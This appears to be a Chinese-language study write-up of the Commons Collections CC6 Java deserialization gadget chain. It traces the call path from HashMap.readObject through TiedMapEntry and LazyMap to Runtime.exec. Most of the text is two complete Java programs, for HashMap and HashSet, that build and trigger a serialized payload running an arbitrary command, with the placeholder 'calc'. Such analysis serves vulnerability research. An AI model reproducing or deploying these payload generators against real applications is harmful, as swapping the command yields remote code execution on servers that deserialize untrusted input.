## 前提

在jdk8u_71之后，AnnotationInvocationHandler类被重写了，修改了readObject方法

因此没办法通过这个类来触发transform了

jdk22的该类

```java
        Map<String, Class<?>> memberTypes = annotationType.memberTypes();
        // consistent with runtime Map type
        Map<String, Object> mv = new LinkedHashMap<>();
```

后续对map的操作都通过LinkHashMap这个类，不再对我们的map进行set或者put操作,导致我们无法触发漏洞

## Hashmap

```java
HashMap.readObject()
HashMap.hash()
    TiedMapEntry.hashCode()
    TiedMapEntry.getValue()
        LazyMap.get()
            ChainedTransformer.transform()
                InvokerTransformer.transform()
                    Method.invoke()
                        Runtime.exec()
```

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.map.LazyMap;

public class CC6 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException {

        String cmd = "calc";

        Transformer[] fakeformer = new Transformer[]{
                new ConstantTransformer("1")
        };
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        //ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //这里先传一个fakechain,防止put在序列化之前就触发
        ChainedTransformer fakechain = new ChainedTransformer(fakeformer);
        Map map1 = new HashMap();
        Map lazy = LazyMap.decorate(map1,fakechain);
        //获取TiedMapEntry类
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy, "1");
        //tiedMapEntry.hashCode();
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry,"2");
        lazy.remove("1");
        //反射修改，将恶意链修改回去
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(fakechain, transformers);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ObjectOutputStream out = new ObjectOutputStream(baos);

        out.writeObject(hashMap);
        out.flush();
        out.close();

        byte[] bytes = baos.toByteArray();

//      System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));

        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);

        ObjectInputStream in = new ObjectInputStream(bais);

        in.readObject();
    }
}


```

 我们的最终目标是跟进Lazymap#get方法

```java
    public Object get(Object key) {
        if (!this.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            this.map.put(key, value);
            return value;
        } else {
            return this.map.get(key);
        }
    }
}
```

get中调用了transform方法

TiedMapEntry类的getvalue中调用了get方法，因此跟到该类的getvalue,getvalue在该类hashcode方法调用。

接下来就需要找一个类调用hashcode

在hashmap中

```
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```

#hash中调用了hashcode,hash又在put方法被调用，因此我们最终的触发是hashmap.put()

+ lazy.remove("1");的作用

  如果我们不进行remove,这会导致lazymap#get无法进if判断

  ```
      public Object get(Object key) {
          if (!this.map.containsKey(key)) {
              Object value = this.factory.transform(key);
              this.map.put(key, value);
              return value;
          } else {
              return this.map.get(key);
          }
      }
  ```

​	 `map.containsKey(key)`是true则不会执行transform方法

## HashSet

和上调链子没有多大的区别，只是用hashset-->hashmap#put

```java
package org.example;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import org.apache.commons.collections.map.LazyMap;

public class CC6_hashset {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException {

        String cmd = "calc";

        Transformer[] fakeformer = new Transformer[]{
                new ConstantTransformer("1")
        };
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        //ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        ChainedTransformer fakechain = new ChainedTransformer(fakeformer);
        Map hashMap = new HashMap();
        Map lazy = LazyMap.decorate(hashMap,fakechain);
        //获取TiedMapEntry类
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy, "1");
        //tiedMapEntry.hashCode();
        HashSet hashSet = new HashSet();
        hashSet.add(tiedMapEntry);
        lazy.remove("1");
        //反射修改，将恶意链修改回去
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(fakechain, transformers);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ObjectOutputStream out = new ObjectOutputStream(baos);

        out.writeObject(hashSet);
        out.flush();
        out.close();

        byte[] bytes = baos.toByteArray();

//      System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));

        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);

        ObjectInputStream in = new ObjectInputStream(bais);

        in.readObject();
    }
}

```

![image-20240509210704930](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240509210704930.png)

这里的map是HashMap，依然是调用put

